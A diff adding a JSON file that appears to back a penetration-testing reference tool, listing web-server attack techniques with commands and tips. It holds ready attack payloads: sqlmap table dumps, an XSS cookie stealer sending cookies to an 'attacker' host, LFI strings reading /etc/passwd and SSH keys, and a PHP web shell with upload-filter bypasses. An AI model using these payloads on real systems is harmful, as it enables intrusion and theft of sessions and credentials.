@@ -1,0 +1,220 @@
+{
+    "name": "HTTP/HTTPS - Web Services",
+    "port": 80,
+    "description": "Web server exploitation techniques",
+    "icon": "🌐",
+    "techniques": [
+        {
+            "id": "http-1",
+            "name": "Directory Brute Force",
+            "difficulty": "Beginner",
+            "description": "Discover hidden directories and files on web servers",
+            "steps": [
+                "Select appropriate wordlist",
+                "Configure scanning tool",
+                "Launch directory scan",
+                "Analyze discovered paths"
+            ],
+            "commands": [
+                {
+                    "tool": "Gobuster",
+                    "command": "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt",
+                    "description": "Fast directory brute forcing"
+                },
+                {
+                    "tool": "Feroxbuster",
+                    "command": "feroxbuster -u http://<target_ip> -w wordlist.txt",
+                    "description": "Recursive directory discovery"
+                },
+                {
+                    "tool": "ffuf",
+                    "command": "ffuf -u http://<target_ip>/FUZZ -w wordlist.txt",
+                    "description": "Fast web fuzzer"
+                },
+                {
+                    "tool": "Dirsearch",
+                    "command": "dirsearch -u http://<target_ip> -e php,html,txt",
+                    "description": "Python directory scanner"
+                }
+            ],
+            "tips": [
+                "Use multiple wordlists for thorough coverage",
+                "Check for backup files (.bak, .old, ~)",
+                "Look for admin panels, .git folders"
+            ]
+        },
+        {
+            "id": "http-2",
+            "name": "SQL Injection",
+            "difficulty": "Intermediate",
+            "description": "Exploit SQL injection vulnerabilities to extract data",
+            "steps": [
+                "Identify injection points",
+                "Test for SQL injection",
+                "Determine database type",
+                "Extract data"
+            ],
+            "commands": [
+                {
+                    "tool": "SQLMap",
+                    "command": "sqlmap -u 'http://<target>/page?id=1' --dbs",
+                    "description": "Automatic SQL injection testing"
+                },
+                {
+                    "tool": "SQLMap (POST)",
+                    "command": "sqlmap -u 'http://<target>/login' --data='user=admin&pass=test' --dbs",
+                    "description": "Test POST parameters"
+                },
+                {
+                    "tool": "SQLMap (Dump)",
+                    "command": "sqlmap -u 'http://<target>/page?id=1' -D database -T users --dump",
+                    "description": "Dump specific table"
+                },
+                {
+                    "tool": "Manual Test",
+                    "command": "' OR '1'='1",
+                    "description": "Classic SQL injection payload"
+                }
+            ],
+            "tips": [
+                "Always try manual testing before automated tools",
+                "Check all input fields, headers, and cookies"
+            ]
+        },
+        {
+            "id": "http-3",
+            "name": "XSS Exploitation",
+            "difficulty": "Intermediate",
+            "description": "Find and exploit Cross-Site Scripting vulnerabilities",
+            "steps": [
+                "Identify input reflection points",
+                "Test basic XSS payloads",
+                "Bypass filters if present"
+            ],
+            "commands": [
+                {
+                    "tool": "Basic Test",
+                    "command": "<script>alert('XSS')</script>",
+                    "description": "Simple XSS test payload"
+                },
+                {
+                    "tool": "Event Handler",
+                    "command": "<img src=x onerror=alert('XSS')>",
+                    "description": "XSS via event handler"
+                },
+                {
+                    "tool": "dalfox",
+                    "command": "dalfox url 'http://<target>/page?q=test'",
+                    "description": "Modern XSS scanner"
+                },
+                {
+                    "tool": "Cookie Stealer",
+                    "command": "<script>document.location='http://attacker/steal?c='+document.cookie</script>",
+                    "description": "Cookie exfiltration payload"
+                }
+            ],
+            "tips": [
+                "Test stored, reflected, and DOM-based XSS",
+                "Try different encodings to bypass WAFs"
+            ]
+        },
+        {
+            "id": "http-4",
+            "name": "Local File Inclusion",
+            "difficulty": "Intermediate",
+            "description": "Read local files through path traversal vulnerabilities",
+            "steps": [
+                "Identify file inclusion parameters",
+                "Test path traversal sequences",
+                "Read sensitive files"
+            ],
+            "commands": [
+                {
+                    "tool": "Basic LFI",
+                    "command": "../../../../../../etc/passwd",
+                    "description": "Classic path traversal"
+                },
+                {
+                    "tool": "PHP Filter",
+                    "command": "php://filter/convert.base64-encode/resource=index.php",
+                    "description": "Read PHP source code"
+                },
+                {
+                    "tool": "Log Poisoning",
+                    "command": "/var/log/apache2/access.log",
+                    "description": "Include log for RCE"
+                }
+            ],
+            "tips": [
+                "Try Windows paths too",
+                "PHP wrappers can lead to RCE",
+                "Check /etc/passwd, ~/.ssh/id_rsa"
+            ]
+        },
+        {
+            "id": "http-5",
+            "name": "Web Shell Upload",
+            "difficulty": "Intermediate",
+            "description": "Upload malicious files to gain code execution",
+            "steps": [
+                "Identify file upload functionality",
+                "Test upload restrictions",
+                "Bypass filters",
+                "Upload web shell"
+            ],
+            "commands": [
+                {
+                    "tool": "PHP Shell",
+                    "command": "<?php system($_GET['cmd']); ?>",
+                    "description": "Simple PHP web shell"
+                },
+                {
+                    "tool": "Extension Bypass",
+                    "command": "shell.php.jpg",
+                    "description": "Double extension bypass"
+                },
+                {
+                    "tool": "Weevely",
+                    "command": "weevely generate password shell.php",
+                    "description": "Generate encrypted shell"
+                }
+            ],
+            "tips": [
+                "Try various extensions: .phtml, .php5, .phar",
+                "Add magic bytes to bypass signature checks"
+            ]
+        },
+        {
+            "id": "http-6",
+            "name": "CMS Exploitation",
+            "difficulty": "Intermediate",
+            "description": "Attack content management systems like WordPress, Joomla",
+            "steps": [
+                "Identify CMS and version",
+                "Enumerate plugins/themes",
+                "Find known vulnerabilities"
+            ],
+            "commands": [
+                {
+                    "tool": "WPScan",
+                    "command": "wpscan --url http://<target> --enumerate ap,at,u",
+                    "description": "WordPress vulnerability scanner"
+                },
+                {
+                    "tool": "JoomScan",
+                    "command": "joomscan -u http://<target>",
+                    "description": "Joomla vulnerability scanner"
+                },
+                {
+                    "tool": "CMSmap",
+                    "command": "cmsmap http://<target>",
+                    "description": "Multi-CMS scanner"
+                }
+            ],
+            "tips": [
+                "Always check for outdated plugins",
+                "Default credentials are common"
+            ]
+        }
+    ]
+}
